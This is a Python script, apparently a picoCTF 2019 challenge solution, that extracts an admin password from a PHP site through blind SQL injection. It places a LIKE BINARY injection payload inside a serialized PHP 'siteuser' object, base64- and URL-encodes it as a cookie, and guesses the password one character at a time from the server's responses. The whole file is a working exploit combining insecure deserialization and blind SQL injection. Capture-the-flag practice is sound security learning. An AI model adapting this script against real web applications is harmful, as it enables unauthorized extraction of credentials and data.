import sys
import requests
import urllib
import string
from base64 import b64encode

# Optimistic because not testing all of unicode.
# Use the '{' and '}' characters because they are part of the picoCTF flag format
# and the password is the flag.
chars_to_test = string.digits + string.ascii_letters + '{}'

flag = ""
while True:
    for char in chars_to_test:
        password = "' or password like BINARY '" + flag + char + "%"
        cookie = 'O:8:"siteuser":2:{{s:8:"username";s:5:"admin";s:8:"password";s:{}:"{}";}}'.format(len(password), password)
        # convert to bytes
        cookie = cookie.encode('ascii')
        cookie = b64encode(cookie).decode('ascii')
        cookie = urllib.parse.quote_plus(urllib.parse.quote_plus(cookie))
        cookie_dict = {"user_info": cookie}
        r = requests.get("http://2019shell1.picoctf.com:62195/index.php?file=admin", cookies=cookie_dict)
        # if login was successful
        if "Flag: Find the admin's password!" in r.text:
            flag += char
            print("Flag: {}".format(flag))
            if char == "}":
                print("Flag found!")
                sys.exit(0)
            break
    # if reach end of `chars_to_test` then break out of while loop
    else:
        break